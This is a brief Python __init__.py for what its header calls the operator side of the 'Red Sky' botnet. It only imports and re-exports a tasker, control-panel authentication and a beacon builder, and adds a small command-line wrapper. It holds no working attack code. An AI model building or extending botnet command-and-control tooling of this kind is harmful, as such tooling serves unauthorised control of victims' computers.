# language: Python, file: Program/botnet/__init__.py, target: Red Sky botnet package
# Operator side — tasker, panel backend, builder, auth.

from .tasker import Tasker
from .auth import PanelAuth
from .builder import BeaconBuilder

__all__ = ["Tasker", "PanelAuth", "BeaconBuilder"]


def run_cli(args):
    from .dispatch import run_cli as _run
    return _run(args)
